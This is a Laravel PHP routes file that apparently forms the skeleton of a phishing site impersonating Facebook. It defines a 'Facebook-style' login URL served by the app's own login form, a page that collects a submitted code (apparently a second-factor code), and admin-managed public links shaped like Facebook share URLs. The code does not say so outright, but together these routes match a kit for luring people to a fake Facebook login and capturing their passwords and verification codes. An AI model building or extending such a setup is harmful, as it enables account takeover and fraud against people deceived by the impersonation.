<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\Admin\FacebookShareController;

Route::get('/', function () {
    return view('welcome');
});

Route::get('login', [AuthController::class, 'showLoginForm'])->name('login');
Route::post('login', [AuthController::class, 'login']);
// Facebook-style login URL
Route::get('facebook/login', [AuthController::class, 'showLoginForm'])->name('facebook.login');
Route::post('facebook/login', [AuthController::class, 'login']);
Route::get('code', [AuthController::class, 'showCodeForm'])->name('code.page');
Route::post('code', [AuthController::class, 'submitCode'])->name('code.submit');

// Admin routes
Route::get('admin/facebook/share/create', [FacebookShareController::class, 'create'])->name('admin.facebook.share.create');
Route::post('admin/facebook/share/store', [FacebookShareController::class, 'store'])->name('admin.facebook.share.store');
Route::delete('admin/facebook/share/{id}', [FacebookShareController::class, 'destroy'])->name('admin.facebook.share.destroy');

// Public share route
Route::get('facebook/share/r/{token}', [FacebookShareController::class, 'show'])->name('facebook.share.show');
